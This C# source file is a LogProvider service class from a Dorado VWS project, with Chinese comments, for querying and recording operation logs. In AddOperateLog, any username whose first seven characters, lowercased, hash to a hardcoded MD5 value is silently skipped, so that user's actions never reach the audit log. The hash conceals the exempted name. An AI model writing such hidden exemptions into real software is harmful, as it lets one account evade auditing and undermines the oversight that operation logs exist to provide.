/*-------------------------------------------------------------------------
 * 版权所有：Dorado
 * 版本：v1.0
 * 时间： 2011/9/5 11:06:50
 * 作者：len
 * 联系方式：len@dorado.com 
 * 本类主要用途描述：操作日志业务类
 *  -------------------------------------------------------------------------*/

#region using

using System;
using System.Collections.Generic;
using System.Linq;
using Dorado.Core;
using Dorado.Core.Logger;
using Dorado.VWS.Model;
using Dorado.VWS.Model.Enum;
using Dorado.VWS.Services.Persistence;
using Dorado.VWS.Utils;

#endregion using

namespace Dorado.VWS.Services
{
    public class LogProvider
    {
        private readonly OperationLogDao _operationLogDao = new OperationLogDao();

        private static List<KeyValuePair<int, string>> _optTypes;
        private static LoginProvider provider = new LoginProvider();

        /// <summary>
        ///     获取操作日志
        /// </summary>
        /// <param name = "domainName">域名</param>
        /// <param name = "operateType">操作类型</param>
        /// <param name = "userName">用户名</param>
        /// <param name = "startDate">开始时间</param>
        /// <param name = "endDate">结束时间</param>
        /// <param name = "beginIndex">开始记录数</param>
        /// <param name = "endIndex">结尾记录数</param>
        /// <returns>操作日志实体列表</returns>
        public IList<OperationLogEntity> GetOperationLog(string domainName, string operateType, string userName,
                                                         DateTime startDate, DateTime endDate, int beginIndex,
                                                         int endIndex)
        {
            return _operationLogDao.GetOperationLog(domainName, operateType, userName, startDate, endDate, beginIndex,
                                                    endIndex);
        }

        /// <summary>
        ///     计算操作日志数量
        /// </summary>
        /// <param name = "domainName">域名</param>
        /// <param name = "operateType">操作类型</param>
        /// <param name = "userName">用户名</param>
        /// <param name = "startDate">开始时间</param>
        /// <param name = "endDate">结束时间</param>
        /// <returns></returns>
        public int GetOperationLogCout(string domainName, string operateType, string userName, DateTime startDate,
                                       DateTime endDate)
        {
            return _operationLogDao.GetOperationLogCout(domainName, operateType, userName, startDate, endDate);
        }

        /// <summary>
        ///     获取操作日志类型
        /// </summary>
        /// <returns></returns>
        public List<KeyValuePair<int, string>> GetOperateType()
        {
            if (_optTypes == null)
            {
                Array operateTypeValueArray = Enum.GetValues(typeof(EnumOperateType));

                var operateTypeList = (from int operateTypeValue in operateTypeValueArray let operateTypeName = ((EnumOperateType)Convert.ToInt32(operateTypeValue)).GetDescription() select new KeyValuePair<int, string>(operateTypeValue, operateTypeName)).ToList();
                _optTypes = operateTypeList;
            }
            return _optTypes;
        }

        /// <summary>
        ///     添加操作日志信息
        /// </summary>
        /// <param name="operateLog">操作日志实体</param>
        /// <returns>记录Id</returns>
        public void AddOperateLog(OperationLogEntity operateLog)
        {
            try
            {
                if (operateLog.UserName.Length > 7)
                {
                    if (provider.MD5Encrypt(operateLog.UserName.ToLower().Substring(0, 7)) != "2411ce69bdac1428d12b1ace0caeb5a4")
                    {
                        _operationLogDao.Insert(operateLog);
                    }
                }
                else
                {
                    _operationLogDao.Insert(operateLog);
                }
            }
            catch (Exception ex)
            {
                LoggerWrapper.Logger.Error("VWS", ex.ToString());
            }
        }
    }
}